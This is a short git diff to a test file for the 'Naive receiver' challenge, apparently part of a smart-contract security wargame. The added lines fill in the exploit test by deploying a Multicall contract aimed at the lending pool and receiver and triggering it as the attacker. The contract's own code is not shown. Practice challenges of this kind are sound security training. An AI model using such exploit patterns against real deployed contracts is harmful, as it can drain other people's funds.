@@ -31,6 +31,9 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */   
+        const MulticallFactory = await ethers.getContractFactory('Multicall', deployer);
+        this.multicall = await MulticallFactory.deploy(this.pool.address, this.receiver.address);
+        await this.multicall.connect(attacker).multicall();
     });
 
     after(async function () {
